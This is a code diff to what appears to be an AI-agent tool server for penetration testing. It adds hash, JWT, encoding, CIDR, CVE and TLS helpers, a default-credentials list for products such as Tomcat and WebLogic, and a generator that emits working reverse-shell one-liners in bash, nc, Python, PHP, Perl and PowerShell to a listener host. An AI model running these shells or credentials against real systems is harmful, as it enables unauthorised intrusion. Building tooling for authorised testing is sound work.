@@ -865,7 +865,284 @@ def _b_vhost_fuzz(a):
     if not wl:
         raise ValueError(f"wordlist '{name}' not found — install seclists")
     return (["ffuf", "-u", url, "-H", f"Host: FUZZ.{domain}", "-w", wl, "-ac", "-s"],
-            "ffuf", 600)
+            "ffuf")
+
+
+# ── python-native tools (no external binary; computed in-process, always available) ──
+# These builders RETURN THE RESULT TEXT (str, or (str, is_error)) instead of an argv —
+# _call_tool detects that and skips the subprocess. Fast, deterministic, dependency-
+# free; they cover logic/lookups that CLI tools do poorly.
+_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+
+
+def _b_hash_identify(a):
+    h = _word(a, "hash").strip()
+    if re.search(r"\s", h):
+        raise ValueError("give one hash at a time")
+    guesses, n = [], len(h)
+    prefix = {"$2": "bcrypt", "$1$": "md5crypt", "$5$": "sha256crypt",
+              "$6$": "sha512crypt", "$y$": "yescrypt", "$7$": "scrypt",
+              "{SSHA}": "SSHA (LDAP)", "{SHA}": "SHA1 (LDAP)", "$apr1$": "apache md5",
+              "$argon2": "argon2"}
+    for p, name in prefix.items():
+        if h.startswith(p):
+            guesses.append(name)
+    if re.fullmatch(r"[0-9a-fA-F]{32}:[0-9a-fA-F]{32}", h):
+        guesses.append("LM:NT (NTLM pair)")
+    if re.fullmatch(r"\*[0-9A-Fa-f]{40}", h):
+        guesses.append("MySQL 4.1+")
+    if re.fullmatch(r"[0-9a-fA-F]+", h):
+        guesses += {32: ["MD5", "NTLM", "MD4"], 40: ["SHA1"], 56: ["SHA224"],
+                    64: ["SHA256"], 96: ["SHA384"], 128: ["SHA512"],
+                    16: ["MySQL<4.1", "CRC64"]}.get(n, [])
+    guesses = list(dict.fromkeys(guesses)) or ["unknown — check length/charset"]
+    return f"length {n}\nlikely: " + ", ".join(guesses)
+
+
+def _b_jwt_decode(a):
+    import base64
+    tok = _word(a, "token").strip()
+    parts = tok.split(".")
+    if len(parts) < 2:
+        raise ValueError("not a JWT (need header.payload[.signature])")
+
+    def _seg(s):
+        return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
+    try:
+        header = json.loads(_seg(parts[0]))
+        payload = json.loads(_seg(parts[1]))
+    except Exception as exc:                            # noqa: BLE001
+        raise ValueError(f"could not decode JWT: {exc}")
+    out = ["header:  " + json.dumps(header), "payload: " + json.dumps(payload)]
+    alg = str(header.get("alg", "")).lower()
+    notes = []
+    if alg in ("none", ""):
+        notes.append("⚠ alg:none — signature not verified (auth bypass)")
+    if alg.startswith("hs"):
+        notes.append("HMAC — crackable offline if the secret is weak")
+    if payload.get("exp"):
+        import datetime
+        notes.append("exp " + datetime.datetime.utcfromtimestamp(
+            int(payload["exp"])).isoformat() + "Z")
+    if notes:
+        out.append("notes:   " + "; ".join(notes))
+    return "\n".join(out)
+
+
+def _b_data_transform(a):
+    import base64
+    import codecs
+    import urllib.parse
+    if "data" not in a:
+        raise ValueError("`data` is required")
+    data = str(a.get("data"))
+    action = (a.get("action") or "decode").lower()
+    enc = (a.get("encoding") or "base64").lower()
+    if action not in ("encode", "decode"):
+        raise ValueError("`action` must be encode or decode")
+    if enc not in ("base64", "hex", "url", "rot13"):
+        raise ValueError("`encoding` must be base64/hex/url/rot13")
+    try:
+        if action == "encode":
+            r = {"base64": lambda: base64.b64encode(data.encode()).decode(),
+                 "hex": lambda: data.encode().hex(),
+                 "url": lambda: urllib.parse.quote(data),
+                 "rot13": lambda: codecs.encode(data, "rot13")}[enc]()
+        else:
+            r = {"base64": lambda: base64.b64decode(
+                    data + "=" * (-len(data) % 4)).decode("utf-8", "replace"),
+                 "hex": lambda: bytes.fromhex(data).decode("utf-8", "replace"),
+                 "url": lambda: urllib.parse.unquote(data),
+                 "rot13": lambda: codecs.decode(data, "rot13")}[enc]()
+    except Exception as exc:                            # noqa: BLE001
+        raise ValueError(f"transform failed: {exc}")
+    return r
+
+
+def _b_cidr_expand(a):
+    import ipaddress
+    try:
+        net = ipaddress.ip_network(_word(a, "cidr").strip(), strict=False)
+    except Exception as exc:                            # noqa: BLE001
+        raise ValueError(f"bad cidr: {exc}")
+    hosts = list(net.hosts()) if net.num_addresses > 2 else list(net)
+    cap = 2048
+    lines = [f"{net} — {net.num_addresses} addresses, {len(hosts)} usable hosts"]
+    lines += [str(h) for h in hosts[:cap]]
+    if len(hosts) > cap:
+        lines.append(f"… (+{len(hosts) - cap} more, capped)")
+    return "\n".join(lines)
+
+
+def _b_ip_info(a):
+    import ipaddress
+    try:
+        obj = ipaddress.ip_address(_word(a, "ip").strip())
+    except Exception as exc:                            # noqa: BLE001
+        raise ValueError(f"bad ip: {exc}")
+    flags = [attr[3:] for attr in ("is_private", "is_loopback", "is_link_local",
+                                   "is_multicast", "is_reserved", "is_global")
+             if getattr(obj, attr)]
+    return f"{obj} — IPv{obj.version}; {', '.join(flags) or 'unspecified'}"
+
+
+_SHELL_TEMPLATES = {
+    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+    "nc_mkfifo": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
+                 "nc {lhost} {lport} >/tmp/f",
+    "python": "python3 -c 'import socket,subprocess,os;s=socket.socket();"
+              "s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];"
+              "subprocess.call([\"/bin/sh\",\"-i\"])'",
+    "php": "php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "perl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,"
+            "getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));"
+            "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
+    "powershell": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',"
+                  "{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read("
+                  "$b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString("
+                  "$b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';"
+                  "$sy=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sy,0,$sy.Length);"
+                  "$s.Flush()}\"",
+}
+
+
+def _b_payload_gen(a):
+    lhost = _word(a, "lhost").strip()
+    if not _HOST_RE.match(lhost):
+        raise ValueError("`lhost` must be an IP/host")
+    try:
+        lport = int(a.get("lport"))
+    except (TypeError, ValueError):
+        raise ValueError("`lport` is required (a port number)")
+    if not 1 <= lport <= 65535:
+        raise ValueError("`lport` must be 1-65535")
+    kind = (a.get("type") or "bash").lower()
+    if kind not in _SHELL_TEMPLATES:
+        raise ValueError("`type` must be one of " + ", ".join(_SHELL_TEMPLATES))
+    payload = _SHELL_TEMPLATES[kind].format(lhost=lhost, lport=lport)
+    return (f"# reverse shell — {kind} (generated, NOT executed)\n{payload}\n\n"
+            f"# start a listener first:\nnc -lvnp {lport}")
+
+
+_DEFAULT_CREDS = {
+    "tomcat": ["tomcat:tomcat", "admin:admin", "tomcat:s3cret", "role1:role1"],
+    "jenkins": ["admin:admin"], "grafana": ["admin:admin"], "jboss": ["admin:admin"],
+    "weblogic": ["weblogic:welcome1", "system:password"], "phpmyadmin": ["root:"],
+    "mysql": ["root:", "root:root", "root:toor"], "postgres": ["postgres:postgres"],
+    "mssql": ["sa:", "sa:sa"], "oracle": ["system:manager", "sys:change_on_install"],
+    "rabbitmq": ["guest:guest"], "elasticsearch": ["elastic:changeme"],
+    "gitlab": ["root:5iveL!fe"], "router": ["admin:admin", "admin:password"],
+    "ssh": ["root:root", "root:toor"], "ftp": ["anonymous:anonymous", "ftp:ftp"],
+    "vnc": ["<no-user>:password"], "mongodb": ["<often no auth>"],
+    "redis": ["<often no auth>"], "cisco": ["cisco:cisco", "admin:admin"],
+    "printer": ["admin:", "admin:admin"], "webmin": ["admin:admin"],
+}
+
+
+def _b_default_creds(a):
+    q = _word(a, "product").strip().lower()
+    hits = {k: v for k, v in _DEFAULT_CREDS.items() if k in q or q in k}
+    if not hits:
+        return (f"no bundled default creds for '{q}'. Try the vendor docs or "
+                "SecLists/Passwords/Default-Credentials.")
+    return "\n".join(f"{k}: " + ", ".join(v) for k, v in hits.items())
+
+
+def _ver_key(v):
+    return tuple(int(x) for x in re.findall(r"\d+", v or ""))
+
+
+def _b_cve_lookup(a):
+    import sqlite3
+    vendor = _word(a, "vendor").strip().lower()
+    product = _word(a, "product").strip().lower()
+    version = _word(a, "version").strip()
+    if not re.search(r"\d", version):
+        raise ValueError("`version` must contain a number")
+    path = os.path.join(_ROOT, "appdata", "cve_index.db")
+    if not os.path.exists(path):
+        return ("[no index] appdata/cve_index.db is not present (built by the "
+                "installer from NVD).", True)
+    try:
+        con = sqlite3.connect(path)
+        rows = con.execute(
+            "SELECT m.exact_ver, m.vsi, m.vse, m.vei, m.vee, m.cve FROM cve_match m "
+            "JOIN product p ON p.id = m.product_id WHERE p.vendor=? AND p.product=?",
+            (vendor, product)).fetchall()
+        con.close()
+    except sqlite3.Error as exc:
+        return (f"index query failed: {exc}", True)
+    vk = _ver_key(version)
+    matched = set()
+    for exact, vsi, vse, vei, vee, cve in rows:
+        if exact:
+            ek = _ver_key(exact)
+            if len(vk) >= len(ek) and vk[:len(ek)] == ek:
+                matched.add(cve)
+        elif len(vk) >= 2 and (vsi or vse) and (vei or vee):   # closed range only
+            def _ge(b):
+                return not b or vk >= _ver_key(b)
+
+            def _le(b):
+                return not b or vk <= _ver_key(b)
+            if _ge(vsi) and _le(vei) and (not vse or vk > _ver_key(vse)) \
+                    and (not vee or vk < _ver_key(vee)):
+                matched.add(cve)
+    if not matched:
+        return f"{product} {version}: no CVEs matched the index (strict version match)."
+    kev = set()
+    try:
+        with open(os.path.join(_ROOT, "appdata", "kev.txt"), encoding="utf-8") as fh:
+            kev = {ln.strip() for ln in fh if ln.startswith("CVE-")}
+    except OSError:
+        pass
+    order = sorted(matched, key=lambda c: tuple(-int(x) for x in re.findall(r"\d+", c)))
+    k = [c for c in order if c in kev]
+    o = [c for c in order if c not in kev]
+    out = [f"{product} {version} — {len(k)} KEV (known-exploited), {len(o)} other"]
+    if k:
+        out.append("KEV: " + ", ".join(k[:20]))
+    if o:
+        out.append("other: " + ", ".join(o[:20]) + (" …" if len(o) > 20 else ""))
+    return "\n".join(out)
+
+
+def _b_tls_analyze(a):
+    import socket
+    import ssl
+    host, port = _req_host(a), _port(a, 443)
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    try:
+        with socket.create_connection((host, port), timeout=10) as sock:
+            with ctx.wrap_socket(sock, server_hostname=host) as ss:
+                ver, cipher = ss.version(), ss.cipher()
+    except Exception as exc:                            # noqa: BLE001
+        return (f"TLS connect to {host}:{port} failed: {exc}", True)
+    note = ""
+    if ver in ("SSLv3", "TLSv1", "TLSv1.1"):
+        note = "  ⚠ obsolete protocol"
+    return (f"{host}:{port}\nprotocol: {ver}{note}\ncipher: {cipher[0]} "
+            f"({cipher[2]} bits)")
+
+
+def _b_robots_sitemap(a):
+    import ssl
+    import urllib.request
+    base = _req_url(a).rstrip("/")
+    unverified = ssl._create_unverified_context()
+    out = []
+    for path in ("/robots.txt", "/sitemap.xml"):
+        try:
+            req = urllib.request.Request(base + path,
+                                         headers={"User-Agent": "Mozilla/5.0"})
+            body = urllib.request.urlopen(req, timeout=15,
+                                          context=unverified).read(20000)
+            out.append(f"== {path} ==\n" + body.decode("utf-8", "replace").strip())
+        except Exception as exc:                        # noqa: BLE001
+            out.append(f"== {path} == (not available: {exc})")
+    return "\n\n".join(out)
 
 
 # name -> (builder, description, inputSchema)
@@ -1314,6 +1591,87 @@ HACKTOOLS = {
             "wordlist": {"type": "string", "description": "small (default) · large · "
                          "common."}},
          "required": ["url", "domain"]}),
+    "hash_identify": (
+        _b_hash_identify,
+        "Identify the likely type(s) of a password hash from the hash string (length, "
+        "charset and prefix heuristics). Useful after dumping hashes.",
+        {"type": "object", "properties": {
+            "hash": {"type": "string", "description": "The hash string, e.g. an "
+                     "NT hash or $6$… crypt."}},
+         "required": ["hash"]}),
+    "jwt_decode": (
+        _b_jwt_decode,
+        "Decode a JWT's header and payload (no verification) and flag weaknesses like "
+        "alg:none or a crackable HMAC secret.",
+        {"type": "object", "properties": {
+            "token": {"type": "string", "description": "The JWT (header.payload."
+                      "signature)."}},
+         "required": ["token"]}),
+    "data_transform": (
+        _b_data_transform,
+        "Encode or decode a string as base64, hex, URL or rot13.",
+        {"type": "object", "properties": {
+            "data": {"type": "string", "description": "The input string."},
+            "action": {"type": "string", "description": "decode (default) or encode."},
+            "encoding": {"type": "string", "description": "base64 (default) · hex · "
+                         "url · rot13."}},
+         "required": ["data"]}),
+    "cidr_expand": (
+        _b_cidr_expand,
+        "Expand a CIDR/subnet to its list of host addresses (capped).",
+        {"type": "object", "properties": {
+            "cidr": {"type": "string", "description": "e.g. 10.0.0.0/24 or "
+                     "192.168.1.0/28."}},
+         "required": ["cidr"]}),
+    "ip_info": (
+        _b_ip_info,
+        "Classify an IP address — version, private/public, loopback, link-local, etc.",
+        {"type": "object", "properties": {
+            "ip": {"type": "string", "description": "IPv4 or IPv6 address."}},
+         "required": ["ip"]}),
+    "payload_gen": (
+        _b_payload_gen,
+        "Generate a reverse-shell one-liner (bash/nc/python/php/perl/powershell) for a "
+        "listener, plus the nc listener command. Generated only — NOT executed.",
+        {"type": "object", "properties": {
+            "lhost": {"type": "string", "description": "Your listener IP."},
+            "lport": {"type": "integer", "description": "Your listener port."},
+            "type": {"type": "string", "description": "bash (default) · nc_mkfifo · "
+                     "python · php · perl · powershell."}},
+         "required": ["lhost", "lport"]}),
+    "default_creds": (
+        _b_default_creds,
+        "Look up common default credentials for a product/service from a bundled list.",
+        {"type": "object", "properties": {
+            "product": {"type": "string", "description": "Product/service, e.g. "
+                        "tomcat, jenkins, grafana, mysql."}},
+         "required": ["product"]}),
+    "cve_lookup": (
+        _b_cve_lookup,
+        "Look up known CVEs for a product/version against the offline NVD index and "
+        "split them into KEV (known-exploited) vs other. Strict version matching.",
+        {"type": "object", "properties": {
+            "vendor": {"type": "string", "description": "NVD vendor, e.g. openbsd, "
+                       "apache, samba."},
+            "product": {"type": "string", "description": "NVD product, e.g. openssh, "
+                        "http_server, samba."},
+            "version": {"type": "string", "description": "Version, e.g. 7.2 or "
+                        "2.4.66."}},
+         "required": ["vendor", "product", "version"]}),
+    "tls_analyze": (
+        _b_tls_analyze,
+        "Connect to a TLS service and report the negotiated protocol and cipher, "
+        "flagging obsolete SSL/TLS versions.",
+        {"type": "object", "properties": {"host": _H, "port": _PORT},
+         "required": ["host"]}),
+    "robots_sitemap": (
+        _b_robots_sitemap,
+        "Fetch and show a site's /robots.txt and /sitemap.xml — often reveal hidden "
+        "paths and endpoints.",
+        {"type": "object", "properties": {
+            "url": {"type": "string", "description": "Base site URL, e.g. "
+                    "http://10.0.0.5."}},
+         "required": ["url"]}),
 }
 
 
@@ -1645,6 +2003,85 @@ _META = {
         ["find virtual hosts on this web server", "fuzz the host header for vhosts",
          "discover name-based virtual hosts", "vhost fuzzing on 10.0.0.5",
          "hidden websites on the same ip"]),
+    "hash_identify": (
+        "Identify the type of a password hash.",
+        "Hash type identification from the hash string: guess whether it's NTLM, MD5, "
+        "SHA1/256/512, bcrypt, md5crypt/sha512crypt, MySQL, LM:NT, etc. by length, "
+        "charset and prefix. Use after dumping hashes to pick the right cracking mode. "
+        "Keywords: hash id, hash-identifier, hashid, identify hash, NTLM, bcrypt, "
+        "crypt, hashcat mode, hash type.",
+        ["what type of hash is this", "identify this hash",
+         "is this an NTLM hash", "which hashcat mode for this hash"]),
+    "jwt_decode": (
+        "Decode and analyse a JWT.",
+        "JWT decoding and analysis: base64-decode the header and payload (no signature "
+        "check) and flag weaknesses — alg:none (auth bypass), crackable HMAC secret, "
+        "expiry. Keywords: jwt, json web token, decode jwt, alg none, bearer token, "
+        "claims, HS256, token analysis.",
+        ["decode this jwt", "analyse the jwt token", "is this jwt using alg none",
+         "what are the claims in this token"]),
+    "data_transform": (
+        "Encode/decode base64, hex, URL, rot13.",
+        "Data encoding/decoding helper: base64, hex, URL-encoding and rot13, encode or "
+        "decode. Handy for CTF and turning captured values into readable text. "
+        "Keywords: base64 decode, hex decode, url decode, encode, rot13, deobfuscate, "
+        "cyberchef.",
+        ["base64 decode this string", "decode this hex", "url-encode this value",
+         "what does this base64 say"]),
+    "cidr_expand": (
+        "Expand a CIDR to its host addresses.",
+        "CIDR/subnet expansion: list the individual host IPs in a network range. "
+        "Keywords: cidr, subnet, expand, ip range, netmask, host list, network hosts.",
+        ["expand 10.0.0.0/24", "list the hosts in this subnet",
+         "what IPs are in this cidr"]),
+    "ip_info": (
+        "Classify an IP (private/public, loopback…).",
+        "IP address classification: version (v4/v6) and whether it's private, public, "
+        "loopback, link-local, multicast or reserved. Keywords: ip info, private ip, "
+        "public ip, rfc1918, loopback, ip classification.",
+        ["is this ip private or public", "classify this ip address",
+         "what kind of ip is 10.0.0.5"]),
+    "payload_gen": (
+        "Generate a reverse-shell one-liner + listener.",
+        "Reverse-shell payload generator: produce a one-liner (bash, nc mkfifo, "
+        "python, php, perl, powershell) for a chosen listener host/port, plus the nc "
+        "listener command. Generated text only — never executed. Keywords: reverse "
+        "shell, revshell, payload, bash -i, nc listener, one-liner, foothold, "
+        "callback, powershell reverse shell.",
+        ["generate a bash reverse shell", "give me a reverse shell one-liner",
+         "powershell reverse shell for this ip and port", "make a revshell payload"]),
+    "default_creds": (
+        "Look up default credentials for a product.",
+        "Default credentials lookup: common out-of-the-box username/password pairs for "
+        "a product or service (tomcat, jenkins, grafana, mysql, mssql, routers…), from "
+        "a bundled list. Keywords: default credentials, default password, factory "
+        "creds, admin admin, out of the box login, weak default.",
+        ["default credentials for tomcat", "what's the default login for jenkins",
+         "default password for this device", "common creds for grafana"]),
+    "cve_lookup": (
+        "Look up CVEs (KEV vs other) for a product/version.",
+        "Offline CVE lookup: match a product/version against the local NVD index and "
+        "list known CVEs, split into CISA KEV (known-exploited) vs other, with strict "
+        "version matching to cut false positives. Keywords: cve, vulnerability lookup, "
+        "known vulnerabilities, KEV, exploited, NVD, version cve, cpe.",
+        ["what CVEs affect openssh 7.2", "look up vulnerabilities for apache 2.4.66",
+         "known CVEs for samba 4.3.9", "any KEV for this version"]),
+    "tls_analyze": (
+        "Report a TLS service's protocol and cipher.",
+        "TLS/SSL handshake analysis: connect and report the negotiated protocol "
+        "version and cipher suite, flagging obsolete SSLv3/TLS1.0/1.1. Complements "
+        "certificate reading. Keywords: tls, ssl, cipher, protocol version, weak tls, "
+        "sslv3, tls1.0, handshake, encryption strength.",
+        ["what tls version does this server use", "check the tls cipher on 443",
+         "is this server using weak tls", "analyse the ssl handshake"]),
+    "robots_sitemap": (
+        "Fetch robots.txt and sitemap.xml.",
+        "Fetch and show a site's /robots.txt and /sitemap.xml — Disallow entries and "
+        "sitemap URLs often reveal hidden paths, admin areas and endpoints. Keywords: "
+        "robots.txt, sitemap.xml, disallow, hidden paths, web recon, endpoints, "
+        "crawler directives.",
+        ["get the robots.txt", "check robots and sitemap for hidden paths",
+         "what does the sitemap reveal", "fetch robots.txt of the site"]),
 }
 
 
@@ -1686,16 +2123,26 @@ def _call_tool(name, arguments):
                 "isError": True}
     builder, _desc, _schema = entry
     try:
-        argv, binary = builder(arguments or {})
+        built = builder(arguments or {})
     except ValueError as exc:                          # bad arguments
         return {"content": [{"type": "text", "text": f"invalid arguments: {exc}"}],
                 "isError": True}
     except Exception as exc:                            # noqa: BLE001
         return {"content": [{"type": "text", "text": f"error: {exc}"}],
                 "isError": True}
-    text, is_error = _run(argv, binary)
-    shown = "$ " + " ".join(argv) + "\n\n" + text
-    return {"content": [{"type": "text", "text": shown}], "isError": is_error}
+    # CLI tool → (argv:list, binary:str), run via subprocess. Python-native tool →
+    # a str result (or a (str, is_error) tuple), already computed in-process.
+    if isinstance(built, tuple) and built and isinstance(built[0], list):
+        argv, binary = built
+        text, is_error = _run(argv, binary)
+        shown = "$ " + " ".join(argv) + "\n\n" + text
+    else:
+        if isinstance(built, tuple):
+            text, is_error = (list(built) + [False])[:2]
+        else:
+            text, is_error = built, False
+        shown = str(text)[:MAX_OUTPUT] or "(no output)"
+    return {"content": [{"type": "text", "text": shown}], "isError": bool(is_error)}
 
 
 def handle_message(msg):
@@ -1782,6 +2229,12 @@ def selftest():
         ("web_content_discovery", {"url": "http://x", "wordlist": "zzz"}, True),  # bad wl
         ("whatweb", {"url": "http://x", "aggression": 9}, True),   # 1-4
         ("nuclei_scan", {"url": "http://x", "severity": "HIGH!"}, True),   # bad sev
+        ("hash_identify", {"hash": "5f4dcc3b5aa765d61d8327deb882cf99"}, False),  # ok
+        ("jwt_decode", {"token": "notajwt"}, True),       # malformed
+        ("data_transform", {"data": "x", "encoding": "morse"}, True),   # bad encoding
+        ("payload_gen", {"lhost": "10.0.0.1"}, True),     # lport required
+        ("cve_lookup", {"vendor": "a", "product": "b", "version": "none"}, True),  # no ver num
+        ("ip_info", {"ip": "999.1.1.1"}, True),           # bad ip
         ("smb_client", {"host": "10.0.0.5"}, False),      # null-session list ok
         ("smb_client", {"host": "10.0.0.5", "username": "a b"}, True),   # bad user
         ("netexec_smb", {"host": "10.0.0.5", "action": "exec"}, True),   # exec needs cmd
